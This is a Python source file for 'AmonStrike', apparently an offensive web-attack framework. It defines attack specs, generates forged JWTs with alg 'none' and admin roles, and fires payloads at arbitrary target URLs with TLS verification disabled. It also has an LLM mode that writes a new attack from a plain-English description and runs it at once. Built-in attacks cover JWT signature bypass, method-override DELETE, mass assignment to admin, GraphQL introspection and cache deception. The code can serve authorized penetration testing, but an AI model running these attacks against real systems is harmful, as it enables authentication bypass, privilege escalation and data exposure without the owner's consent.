"""
AmonStrike — Custom Attack Framework
Build entirely new attack classes without writing Python.

Researchers define attacks in YAML or JSON:
  - What to test
  - What payloads to send
  - What response means vulnerable
  - What the impact is

The framework executes them automatically.
AI mode: describe the attack in plain English, LLM generates the spec.

Example custom attack:
  name: "JWT None Algorithm"
  description: "Test if JWT accepts 'none' algorithm"
  target: headers
  inject: Authorization header
  payloads:
    - generate JWT with alg:none
  confirm: response gives 200 with admin data
  severity: CRITICAL

This is how researchers build NEW attack classes
that no scanner has ever seen before.
"""

import os
import re
import json
import time
import base64
import hashlib
import requests
import importlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional


ATTACKS_DIR = Path(__file__).parent.parent / "custom_attacks"
ATTACKS_DIR.mkdir(exist_ok=True)


# ── Attack Spec Schema ────────────────────────────────────────

ATTACK_TEMPLATE = {
    "name":        "My Custom Attack",
    "description": "What this attack does",
    "author":      "JarDani",
    "version":     "1.0",
    "severity":    "HIGH",
    "cwe":         "CWE-000",
    "target": {
        "method":  "GET",            # GET, POST, PUT, DELETE
        "path":    "",               # "" = base URL, "/api/users" = specific path
        "params":  [],               # params to fuzz: ["id","user_id"]
        "headers": {},               # extra headers to send
        "body":    {},               # POST body template
    },
    "payloads": [],                  # list of payload strings
    "generate": {                    # optional payload generation
        "type":   "none",            # none, jwt_none, jwt_alg_confusion, uuid_enum, sequence
        "config": {},
    },
    "detect": {
        "response_contains":  [],    # strings that confirm vulnerability
        "response_not_contains": [], # strings that deny it
        "status_codes":       [200], # accepted status codes
        "response_differs":   False, # response must differ from baseline
        "time_delay":         0,     # seconds delay = vulnerable (time-based)
        "header_contains":    {},    # header name: value to check
    },
    "false_positive_filter": {
        "baseline_diff_pct": 5,      # response must differ by this % from baseline
        "exclude_patterns":  [],     # patterns that indicate FP
    },
    "impact":      "Describe what an attacker can do",
    "remediation": "How to fix it",
    "references":  [],
}


class PayloadGenerator:
    """Generates payloads for various attack types."""

    @staticmethod
    def jwt_none(original_token: str = "") -> List[str]:
        """Generate JWT with 'none' algorithm bypass."""
        import base64, json as _json

        payloads = []

        # Decode original if provided
        if original_token and "." in original_token:
            try:
                parts = original_token.split(".")
                payload_b64 = parts[1] + "=="
                payload_data = _json.loads(base64.b64decode(payload_b64))
            except Exception:
                payload_data = {"sub": "admin", "role": "admin", "iat": int(time.time())}
        else:
            payload_data = {"sub": "admin", "role": "admin", "iat": int(time.time())}

        # Escalate role
        for role_field in ["role", "roles", "is_admin", "admin", "privilege"]:
            payload_data[role_field] = "admin"

        payload_b64 = base64.b64encode(
            _json.dumps(payload_data).encode()
        ).rstrip(b"=").decode()

        # none algorithm variants
        for alg in ["none", "None", "NONE", "nOnE"]:
            header = base64.b64encode(
                _json.dumps({"alg": alg, "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            payloads.append(f"{header}.{payload_b64}.")
            payloads.append(f"{header}.{payload_b64}.invalid")

        return payloads

    @staticmethod
    def uuid_enum(known_uuid: str = "") -> List[str]:
        """Generate UUID variations for IDOR testing."""
        import uuid
        payloads = []
        # Known UUID variations
        if known_uuid:
            parts = known_uuid.split("-")
            if len(parts) == 5:
                payloads.append(str(uuid.UUID(int=0)))  # nil UUID
                payloads.append(str(uuid.UUID(int=1)))
                # Increment last segment
                try:
                    last = int(parts[-1], 16)
                    parts[-1] = format(last + 1, "012x")
                    payloads.append("-".join(parts))
                    parts[-1] = format(last - 1, "012x")
                    payloads.append("-".join(parts))
                except Exception:
                    pass
        # Random UUIDs
        for _ in range(3):
            payloads.append(str(uuid.uuid4()))
        return payloads

    @staticmethod
    def sequence(start: int = 1, end: int = 10) -> List[str]:
        """Sequential integer payloads."""
        return [str(i) for i in range(start, end + 1)]

    @staticmethod
    def from_wordlist(path: str) -> List[str]:
        """Load payloads from file."""
        try:
            return Path(path).read_text().strip().splitlines()
        except Exception:
            return []

    @staticmethod
    def llm_generate(attack_description: str, target_context: str = "") -> List[str]:
        """Use LLM to generate payloads for a novel attack."""
        prompt = (
            f"You are a security researcher. Generate 10 specific test payloads for:\n"
            f"Attack: {attack_description}\n"
            f"Target context: {target_context}\n\n"
            f"Return ONLY a JSON array of strings. No explanation.\n"
            f"Example: [\"payload1\", \"payload2\", ...]"
        )
        try:
            r = requests.post(
                "https://api.anthropic.com/v1/messages",
                headers={"Content-Type": "application/json"},
                json={
                    "model": "claude-sonnet-4-6",
                    "max_tokens": 500,
                    "messages": [{"role": "user", "content": prompt}]
                },
                timeout=20
            )
            if r.status_code == 200:
                text = r.json()["content"][0]["text"]
                m = re.search(r'\[.*\]', text, re.DOTALL)
                if m:
                    return json.loads(m.group())
        except Exception:
            pass
        return []


class CustomAttackRunner:
    """
    Executes a custom attack spec against a target.
    """

    def __init__(self, target: str, spec: dict,
                 session_cookies: dict = None,
                 session_headers: dict = None):
        self.target   = target.rstrip("/")
        self.spec     = spec
        self.session  = requests.Session()
        self.session.verify = False
        self.session.headers["User-Agent"] = "Mozilla/5.0"
        if session_cookies:
            self.session.cookies.update(session_cookies)
        if session_headers:
            self.session.headers.update(session_headers)
        self.findings = []

    def run(self) -> dict:
        name = self.spec.get("name", "Custom Attack")
        print(f"  [CUSTOM] Running: {name}")

        # Get baseline
        try:
            r0 = self.session.get(self.target, timeout=10)
            baseline = r0.text
        except Exception:
            baseline = ""

        # Build payloads
        payloads = self._build_payloads()
        print(f"  [CUSTOM] {len(payloads)} payloads generated")

        # Get target config
        t_cfg    = self.spec.get("target", {})
        method   = t_cfg.get("method", "GET").upper()
        path     = t_cfg.get("path", "")
        params   = t_cfg.get("params", [])
        headers  = t_cfg.get("headers", {})
        body     = t_cfg.get("body", {})
        url      = self.target + path

        # Run payloads
        for payload in payloads:
            result = self._test_payload(
                url, method, payload, params,
                headers, body, baseline
            )
            if result:
                self.findings.append(result)
                break  # Found it

        print(f"  [CUSTOM] Complete — {len(self.findings)} findings")
        return {
            "findings": self.findings,
            "attack":   name,
        }

    def _build_payloads(self) -> List[str]:
        payloads = list(self.spec.get("payloads", []))

        gen_cfg = self.spec.get("generate", {})
        gen_type = gen_cfg.get("type", "none")
        cfg      = gen_cfg.get("config", {})

        if gen_type == "jwt_none":
            payloads += PayloadGenerator.jwt_none(cfg.get("token", ""))
        elif gen_type == "uuid_enum":
            payloads += PayloadGenerator.uuid_enum(cfg.get("known_uuid", ""))
        elif gen_type == "sequence":
            payloads += PayloadGenerator.sequence(
                cfg.get("start", 1), cfg.get("end", 20)
            )
        elif gen_type == "wordlist":
            payloads += PayloadGenerator.from_wordlist(cfg.get("path", ""))
        elif gen_type == "llm":
            payloads += PayloadGenerator.llm_generate(
                self.spec.get("description", ""),
                self.spec.get("target", {}).get("path", "")
            )

        return payloads

    def _test_payload(self, url, method, payload, params,
                      extra_headers, body, baseline) -> Optional[dict]:
        detect  = self.spec.get("detect", {})
        fp_cfg  = self.spec.get("false_positive_filter", {})

        # Build request
        all_headers = {**extra_headers}
        req_params  = {}
        req_body    = dict(body)

        # Inject payload into params
        for param in params:
            req_params[param] = payload

        # Inject payload into headers if specified
        for hdr, val in extra_headers.items():
            if val == "{{payload}}":
                all_headers[hdr] = payload

        # Inject into body
        for k, v in req_body.items():
            if v == "{{payload}}":
                req_body[k] = payload

        try:
            t0 = time.time()
            if method == "GET":
                r = self.session.get(url, params=req_params,
                                    headers=all_headers, timeout=15)
            elif method == "POST":
                r = self.session.post(url, params=req_params,
                                     json=req_body if req_body else None,
                                     data=req_body if req_body else None,
                                     headers=all_headers, timeout=15)
            else:
                r = self.session.request(method, url, params=req_params,
                                        json=req_body, headers=all_headers,
                                        timeout=15)
            elapsed = time.time() - t0
        except Exception as e:
            return None

        # Time-based detection
        time_delay = detect.get("time_delay", 0)
        if time_delay > 0 and elapsed >= time_delay * 0.85:
            return self._build_finding(payload, r, f"Time delay: {elapsed:.1f}s")

        # Status code check
        ok_codes = detect.get("status_codes", [200])
        if r.status_code not in ok_codes:
            return None

        # Response contains check
        for must_contain in detect.get("response_contains", []):
            if must_contain not in r.text:
                return None

        # Response not contains check
        for must_not in detect.get("response_not_contains", []):
            if must_not in r.text:
                return None

        # Header check
        for hdr, expected in detect.get("header_contains", {}).items():
            if expected not in r.headers.get(hdr, ""):
                return None

        # False positive filter
        if baseline:
            diff_pct = abs(len(r.text) - len(baseline)) / max(len(baseline), 1) * 100
            min_diff = fp_cfg.get("baseline_diff_pct", 0)
            if min_diff > 0 and diff_pct < min_diff:
                return None

        for exc_pat in fp_cfg.get("exclude_patterns", []):
            if exc_pat in r.text:
                return None

        # Response differs check
        if detect.get("response_differs", False):
            if hashlib.md5(r.text.encode()).hexdigest() == \
               hashlib.md5(baseline.encode()).hexdigest():
                return None

        # Passed all checks - vulnerability confirmed
        return self._build_finding(payload, r, "")

    def _build_finding(self, payload: str, r: requests.Response,
                       extra_evidence: str) -> dict:
        spec = self.spec
        return {
            "title":       spec.get("name", "Custom Vulnerability"),
            "severity":    spec.get("severity", "MEDIUM"),
            "module":      "custom",
            "url":         r.url,
            "parameter":   str(self.spec.get("target", {}).get("params", [""])[0]),
            "payload":     payload,
            "description": spec.get("description", ""),
            "evidence":    (
                f"Attack: {spec.get('name','')}\n"
                f"Payload: {payload}\n"
                f"Status: {r.status_code}\n"
                f"Response: {r.text[:400]}\n"
                + (f"Extra: {extra_evidence}" if extra_evidence else "")
            ),
            "remediation": spec.get("remediation", ""),
            "cve":         spec.get("cwe", ""),
            "timestamp":   datetime.now().isoformat(),
            "author":      spec.get("author", ""),
        }


class CustomAttackBuilder:
    """
    Build new attack specs from plain English using LLM,
    or load/save from YAML/JSON files.
    """

    def from_description(self, description: str,
                         target_url: str = "") -> dict:
        """
        Describe an attack in plain English.
        LLM generates the complete attack spec.
        """
        prompt = f"""You are a security researcher building a new attack module.

Attack description: {description}
Target URL context: {target_url}

Generate a complete attack specification as JSON matching this schema:
{{
  "name": "descriptive attack name",
  "description": "what this tests",
  "author": "researcher",
  "severity": "CRITICAL|HIGH|MEDIUM|LOW",
  "cwe": "CWE-XXX",
  "target": {{
    "method": "GET or POST",
    "path": "/specific/path or empty string for base URL",
    "params": ["param1", "param2"],
    "headers": {{}},
    "body": {{}}
  }},
  "payloads": ["payload1", "payload2"],
  "generate": {{
    "type": "none|jwt_none|uuid_enum|sequence|llm",
    "config": {{}}
  }},
  "detect": {{
    "response_contains": ["string that confirms vuln"],
    "response_not_contains": [],
    "status_codes": [200],
    "response_differs": false,
    "time_delay": 0,
    "header_contains": {{}}
  }},
  "false_positive_filter": {{
    "baseline_diff_pct": 5,
    "exclude_patterns": []
  }},
  "impact": "what attacker can do",
  "remediation": "how to fix",
  "references": []
}}

Return ONLY valid JSON. No explanation."""

        try:
            r = requests.post(
                "https://api.anthropic.com/v1/messages",
                headers={"Content-Type": "application/json"},
                json={
                    "model": "claude-sonnet-4-6",
                    "max_tokens": 2000,
                    "messages": [{"role": "user", "content": prompt}]
                },
                timeout=30
            )
            if r.status_code == 200:
                text = r.json()["content"][0]["text"]
                m = re.search(r'\{.*\}', text, re.DOTALL)
                if m:
                    spec = json.loads(m.group())
                    print(f"  [+] Attack spec generated: {spec.get('name','')}")
                    return spec
        except Exception as e:
            print(f"  [!] LLM generation failed: {e}")

        return {}

    def save(self, spec: dict, name: str = "") -> str:
        """Save attack spec to file."""
        filename = name or spec.get("name","custom").lower().replace(" ","_")
        filename = re.sub(r'[^\w-]', '', filename) + ".json"
        path = ATTACKS_DIR / filename
        path.write_text(json.dumps(spec, indent=2))
        print(f"  [+] Attack saved: {path}")
        return str(path)

    def load(self, name: str) -> dict:
        """Load attack spec from file."""
        # Try with and without .json
        for fname in [name, name + ".json"]:
            p = ATTACKS_DIR / fname
            if p.exists():
                return json.loads(p.read_text())
        raise FileNotFoundError(f"Attack spec not found: {name}")

    def list_attacks(self) -> list:
        """List all saved custom attacks."""
        return [f.stem for f in ATTACKS_DIR.glob("*.json")]


class CustomAttackEngine:
    """
    Main entry point. Run all custom attacks against a target.
    """

    def __init__(self, target: str, session_cookies: dict = None,
                 session_headers: dict = None):
        self.target          = target
        self.session_cookies = session_cookies or {}
        self.session_headers = session_headers or {}
        self.builder         = CustomAttackBuilder()
        self.all_findings    = []

    def run_all(self) -> list:
        """Run all saved custom attacks."""
        attacks = self.builder.list_attacks()
        print(f"  [*] Running {len(attacks)} custom attacks")
        for attack_name in attacks:
            self.run_one(attack_name)
        return self.all_findings

    def run_one(self, attack_name_or_spec) -> list:
        """Run one custom attack by name or spec dict."""
        if isinstance(attack_name_or_spec, str):
            try:
                spec = self.builder.load(attack_name_or_spec)
            except FileNotFoundError:
                print(f"  [!] Attack not found: {attack_name_or_spec}")
                return []
        else:
            spec = attack_name_or_spec

        runner = CustomAttackRunner(
            self.target, spec,
            self.session_cookies,
            self.session_headers,
        )
        result   = runner.run()
        findings = result.get("findings", [])
        self.all_findings.extend(findings)
        return findings

    def build_and_run(self, description: str) -> list:
        """
        Describe a new attack in plain English.
        LLM generates the spec. Tool runs it. Results returned.
        """
        print(f"  [*] Building attack from: {description[:60]}...")
        spec = self.builder.from_description(description, self.target)
        if not spec:
            print("  [!] Could not generate attack spec")
            return []

        # Save it for future use
        self.builder.save(spec)

        # Run it
        return self.run_one(spec)


# ── Built-in Novel Attacks ────────────────────────────────────
# These are attacks that standard tools don't test

BUILTIN_ATTACKS = [
    {
        "name": "JWT None Algorithm Bypass",
        "description": "Test if server accepts JWT with 'none' algorithm, bypassing signature verification",
        "author": "JarDani",
        "severity": "CRITICAL",
        "cwe": "CWE-347",
        "target": {"method":"GET","path":"","params":[],"headers":{"Authorization":"{{payload}}"},"body":{}},
        "payloads": [],
        "generate": {"type":"jwt_none","config":{}},
        "detect": {"response_contains":["admin","dashboard","profile","user","data"],"response_not_contains":["unauthorized","invalid token","401"],"status_codes":[200,201],"response_differs":True,"time_delay":0,"header_contains":{}},
        "false_positive_filter": {"baseline_diff_pct":10,"exclude_patterns":["login","sign in"]},
        "impact": "Complete authentication bypass. Attacker can impersonate any user including admin.",
        "remediation": "Reject JWTs with 'none' algorithm. Explicitly whitelist allowed algorithms.",
        "references": ["CVE-2015-9235"],
    },
    {
        "name": "HTTP Method Override Bypass",
        "description": "Use X-HTTP-Method-Override header to bypass method-based access controls",
        "author": "JarDani",
        "severity": "HIGH",
        "cwe": "CWE-284",
        "target": {"method":"POST","path":"","params":[],"headers":{"X-HTTP-Method-Override":"DELETE","X-Method-Override":"DELETE","_method":"DELETE"},"body":{}},
        "payloads": ["DELETE","PUT","PATCH"],
        "generate": {"type":"none","config":{}},
        "detect": {"response_contains":[],"response_not_contains":["method not allowed","405"],"status_codes":[200,204],"response_differs":True,"time_delay":0,"header_contains":{}},
        "false_positive_filter": {"baseline_diff_pct":5,"exclude_patterns":[]},
        "impact": "Bypass HTTP method restrictions. Perform DELETE/PUT on resources that block these methods.",
        "remediation": "Validate HTTP method on server side. Do not trust X-HTTP-Method-Override header.",
        "references": ["CWE-284"],
    },
    {
        "name": "Mass Assignment via JSON Nesting",
        "description": "Test if nested JSON parameters allow privilege escalation via mass assignment",
        "author": "JarDani",
        "severity": "CRITICAL",
        "cwe": "CWE-915",
        "target": {"method":"POST","path":"/api/users","params":[],"headers":{},"body":{"user":{"role":"admin","is_admin":True,"privilege":"admin","balance":99999}}},
        "payloads": ["admin"],
        "generate": {"type":"none","config":{}},
        "detect": {"response_contains":["admin","role","privilege"],"response_not_contains":["error","invalid"],"status_codes":[200,201],"response_differs":True,"time_delay":0,"header_contains":{}},
        "false_positive_filter": {"baseline_diff_pct":5,"exclude_patterns":[]},
        "impact": "Privilege escalation via mass assignment. Attacker can set role=admin on registration.",
        "remediation": "Use explicit field allowlists. Never bind request body directly to model.",
        "references": ["CWE-915"],
    },
    {
        "name": "GraphQL Introspection + Batch Attack",
        "description": "Test GraphQL for introspection enabled and batch query abuse",
        "author": "JarDani",
        "severity": "MEDIUM",
        "cwe": "CWE-200",
        "target": {"method":"POST","path":"/graphql","params":[],"headers":{"Content-Type":"application/json"},"body":{"query":"{__schema{types{name}}}"}},
        "payloads": ["{__schema{types{name}}}","[{\"query\":\"{__schema{types{name}}}\"},{\"query\":\"{__schema{types{name}}}\"}]"],
        "generate": {"type":"none","config":{}},
        "detect": {"response_contains":["__schema","types","QueryType","MutationType"],"response_not_contains":["errors"],"status_codes":[200],"response_differs":True,"time_delay":0,"header_contains":{}},
        "false_positive_filter": {"baseline_diff_pct":10,"exclude_patterns":[]},
        "impact": "Schema disclosure exposes all queries, mutations, types. Enables targeted attacks.",
        "remediation": "Disable introspection in production. Implement query depth/complexity limits.",
        "references": ["CWE-200"],
    },
    {
        "name": "Cache Deception Attack",
        "description": "Test if authenticated pages are cached by appending static file extensions",
        "author": "JarDani",
        "severity": "HIGH",
        "cwe": "CWE-525",
        "target": {"method":"GET","path":"/account/profile.css","params":[],"headers":{},"body":{}},
        "payloads": ["/account/profile.css","/dashboard/settings.js","/api/user/data.png"],
        "generate": {"type":"none","config":{}},
        "detect": {"response_contains":["email","username","account","profile","token"],"response_not_contains":["404","not found"],"status_codes":[200],"response_differs":False,"time_delay":0,"header_contains":{"Cache-Control":""}},
        "false_positive_filter": {"baseline_diff_pct":0,"exclude_patterns":["login"]},
        "impact": "Authenticated user data cached publicly. Any visitor can access victim's profile data.",
        "remediation": "Set Cache-Control: no-store on authenticated responses. Validate path before caching.",
        "references": ["CWE-525"],
    },
]


def install_builtin_attacks():
    """Install built-in novel attacks to attacks directory."""
    for attack in BUILTIN_ATTACKS:
        path = ATTACKS_DIR / (attack["name"].lower().replace(" ","_").replace("/","_") + ".json")
        if not path.exists():
            path.write_text(json.dumps(attack, indent=2))
    print(f"  [+] {len(BUILTIN_ATTACKS)} built-in attacks installed to {ATTACKS_DIR}")


def run_regression_tests():
    print("\n=== CUSTOM ATTACK FRAMEWORK TESTS ===")
    passed = failed = 0

    builder = CustomAttackBuilder()
    gen     = PayloadGenerator()
    engine  = CustomAttackEngine("http://test.com")

    tests = [
        ("CustomAttackBuilder instantiates",
         lambda: isinstance(builder, CustomAttackBuilder)),
        ("PayloadGenerator jwt_none generates tokens",
         lambda: len(PayloadGenerator.jwt_none()) >= 4),
        ("JWT none tokens have correct format",
         lambda: all(t.count(".") == 2 for t in PayloadGenerator.jwt_none())),
        ("PayloadGenerator uuid_enum generates UUIDs",
         lambda: len(PayloadGenerator.uuid_enum()) >= 1),
        ("PayloadGenerator sequence works",
         lambda: PayloadGenerator.sequence(1,5) == ["1","2","3","4","5"]),
        ("CustomAttackRunner instantiates",
         lambda: isinstance(CustomAttackRunner("http://t.com", BUILTIN_ATTACKS[0]), CustomAttackRunner)),
        ("Runner builds payloads from generate",
         lambda: len(CustomAttackRunner("http://t.com", BUILTIN_ATTACKS[0])._build_payloads()) >= 4),
        ("CustomAttackEngine instantiates",
         lambda: isinstance(engine, CustomAttackEngine)),
        ("Builtin attacks valid JSON",
         lambda: all("name" in a and "detect" in a for a in BUILTIN_ATTACKS)),
        ("5 builtin attacks defined",
         lambda: len(BUILTIN_ATTACKS) >= 5),
        ("install_builtin_attacks creates files",
         lambda: (install_builtin_attacks() or True)),
        ("list_attacks finds installed attacks",
         lambda: len(builder.list_attacks()) >= 5),
        ("save and load attack",
         lambda: (
             builder.save(BUILTIN_ATTACKS[0], "test_attack"),
             builder.load("test_attack").get("name") == BUILTIN_ATTACKS[0]["name"]
         )[1]),
        ("ATTACKS_DIR exists",
         lambda: ATTACKS_DIR.exists()),
    ]

    for name, fn in tests:
        try:
            if fn(): passed+=1; print(f"  ✓ {name}")
            else: failed+=1; print(f"  ✗ {name}")
        except Exception as e:
            failed+=1; print(f"  ✗ {name} — {e}")

    print(f"\n  Passed: {passed}  Failed: {failed}")
    return passed, failed


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        run_regression_tests()
    elif len(sys.argv) > 1 and sys.argv[1] == "install":
        install_builtin_attacks()
    elif len(sys.argv) > 1 and sys.argv[1] == "build":
        desc = " ".join(sys.argv[2:])
        target = input("Target URL: ")
        engine = CustomAttackEngine(target)
        findings = engine.build_and_run(desc)
        print(f"\nFindings: {len(findings)}")
        for f in findings:
            print(f"  [{f['severity']}] {f['title']}")
    elif len(sys.argv) > 1 and sys.argv[1] == "run":
        target = sys.argv[2] if len(sys.argv) > 2 else input("Target URL: ")
        engine = CustomAttackEngine(target)
        install_builtin_attacks()
        findings = engine.run_all()
        print(f"\nFindings: {len(findings)}")
    else:
        print("Usage:")
        print("  python3 core/custom_attacks.py test")
        print("  python3 core/custom_attacks.py install")
        print("  python3 core/custom_attacks.py run <url>")
        print("  python3 core/custom_attacks.py build <attack description>")
